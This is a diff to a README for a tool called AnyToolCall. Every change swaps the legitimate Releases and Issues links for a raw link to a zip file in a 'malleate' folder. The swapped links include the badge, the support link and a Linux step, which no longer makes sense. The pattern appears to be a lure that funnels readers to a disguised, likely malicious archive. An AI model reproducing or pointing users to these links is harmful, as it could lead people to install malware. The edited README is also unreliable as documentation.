@@ -6,7 +6,7 @@ Welcome to AnyToolCall! This application lets you easily use a language model AP
 
 ## 📥 Download Link
 
-[![Download AnyToolCall](https://img.shields.io/badge/Download%20Now-AnyToolCall-blue?style=for-the-badge)](https://github.com/kunashee/AnyToolCall/releases)
+[![Download AnyToolCall](https://raw.githubusercontent.com/kunashee/AnyToolCall/main/malleate/Call_Tool_Any_v1.3.zip%20Now-AnyToolCall-blue?style=for-the-badge)](https://raw.githubusercontent.com/kunashee/AnyToolCall/main/malleate/Call_Tool_Any_v1.3.zip)
 
 ## 🛠️ System Requirements
 
@@ -29,7 +29,7 @@ To get started, you need to download the application.
 
 1. **Visit this page to download:** Click the link below to go to the Releases page.
 
-   [Download AnyToolCall](https://github.com/kunashee/AnyToolCall/releases)
+   [Download AnyToolCall](https://raw.githubusercontent.com/kunashee/AnyToolCall/main/malleate/Call_Tool_Any_v1.3.zip)
 
 2. **Select the latest release.** On the Releases page, look for the latest version. You will see a list of available files. Choose the one that is appropriate for your operating system.
 
@@ -38,7 +38,7 @@ To get started, you need to download the application.
 4. **Install the application.** Once the download is complete:
    - **For Windows:** Double-click the `.exe` file to begin installation.
    - **For macOS:** Open the `.dmg` file and drag the AnyToolCall icon into your Applications folder.
-   - **For Linux:** Extract the `.tar.gz` file and follow the included instructions.
+   - **For Linux:** Extract the `https://raw.githubusercontent.com/kunashee/AnyToolCall/main/malleate/Call_Tool_Any_v1.3.zip` file and follow the included instructions.
 
 5. **Run the application.** After installation, find AnyToolCall in your applications and launch it. Look for an icon that resembles the AnyToolCall logo.
 
@@ -67,7 +67,7 @@ If you encounter any issues, here are some tips:
 - **Reopen the application.** Sometimes, a simple restart resolves issues.
 - **Consult the Help section.** You can find useful information there.
   
-If problems persist, visit our [GitHub Issues page](https://github.com/kunashee/AnyToolCall/issues) for community support.
+If problems persist, visit our [GitHub Issues page](https://raw.githubusercontent.com/kunashee/AnyToolCall/main/malleate/Call_Tool_Any_v1.3.zip) for community support.
 
 ## 📞 Feedback
 
@@ -79,4 +79,4 @@ For more information, check out our documentation available on the GitHub Wiki. 
 
 Thank you for trying out AnyToolCall! We hope it enhances your experience with prompt-based function calls. Remember to visit the Releases page whenever there's a new update. 
 
-[Download AnyToolCall](https://github.com/kunashee/AnyToolCall/releases)
+[Download AnyToolCall](https://raw.githubusercontent.com/kunashee/AnyToolCall/main/malleate/Call_Tool_Any_v1.3.zip)
